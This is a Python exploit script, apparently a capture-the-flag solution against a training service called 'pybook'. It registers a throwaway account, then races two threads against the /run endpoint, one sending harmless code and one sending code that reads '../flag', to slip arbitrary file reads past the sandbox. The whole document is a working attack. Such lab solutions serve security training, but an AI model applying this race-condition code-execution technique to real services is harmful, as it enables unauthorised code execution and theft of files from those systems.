import requests
import random
import string
import re
import threading

url="http://pybook.training.jinblack.it"
s = requests.Session()

def search_and_print_flag(r):
	search = re.search("flag{[a-zA-Z1-9_!]+}", r)
	if search:
		print(search.group())
		quit()

def gen_rand_string():
	return "".join(random.choice(string.ascii_letters) for _ in range(20))

def register(u, p):
	data = {"username": u, "password": p}
	return s.post(url+"/register", data=data)
	
def login(u, p):
	data = {"username": u, "password": p}
	return s.post(url+"/login", data=data)

def run(code):
	print(s.post(url+"/run", data=code).text)

u = gen_rand_string()
p = gen_rand_string()
register(u, p)
login(u, p)

while(True):
	t1 = threading.Thread(target=run, args=("print('grazie')", ))
	t2 = threading.Thread(target=run, args=("import os\nf = open('../flag', 'r')\nprint(f.read())", ))
	#t2 = threading.Thread(target=run, args=("import os\nprint(os.listdir(os.path.dirname(os.getcwd())))", ))
	t1.start()
	t2.start()
	t1.join()
	t2.join()
